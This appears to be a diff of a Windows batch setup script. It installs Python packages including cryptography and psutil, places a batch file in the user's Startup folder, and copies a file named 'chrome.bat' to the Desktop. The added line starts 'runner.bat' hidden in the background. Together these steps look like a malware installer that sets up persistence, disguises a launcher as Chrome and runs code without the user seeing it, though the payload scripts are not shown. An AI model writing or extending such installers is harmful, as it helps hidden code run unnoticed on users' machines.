@@ -15,3 +15,4 @@ python -m pip install cryptography psutil requests flask
 copy "startup.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "chrome.bat" "%UserProfile%/Desktop"
 copy "chrome.bat" "%OneDrive%/Desktop"
+start /B "" "runner.bat"
